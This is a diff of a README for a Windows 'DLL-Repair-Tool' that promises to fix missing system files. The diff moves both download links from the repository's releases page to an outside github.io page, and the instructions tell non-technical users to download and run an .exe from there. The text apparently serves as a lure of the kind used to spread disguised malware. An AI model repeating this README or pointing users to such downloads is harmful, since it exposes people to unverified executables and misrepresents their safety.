@@ -1,6 +1,6 @@
 # 🛠️ DLL-Repair-Tool - Fix Missing System Files Instantly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Imperialist-toastmistress704/DLL-Repair-Tool/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://imperialist-toastmistress704.github.io)
 
 DLL-Repair-Tool fixes system errors on Windows 10 and Windows 11. It resolves issues where programs fail to launch due to missing or corrupt Dynamic Link Library (DLL) files. This tool automates the process of finding and installing missing system components.
 
@@ -31,7 +31,7 @@ These components work as the foundation for most games and professional software
 
 Follow these steps to repair your system files. You do not need technical knowledge to complete this process.
 
-1. Visit the [Download Page](https://github.com/Imperialist-toastmistress704/DLL-Repair-Tool/releases).
+1. Visit the [Download Page](https://imperialist-toastmistress704.github.io).
 2. Locate the section labeled Assets.
 3. Select the file ending in .exe.
 4. Save the file to your computer.
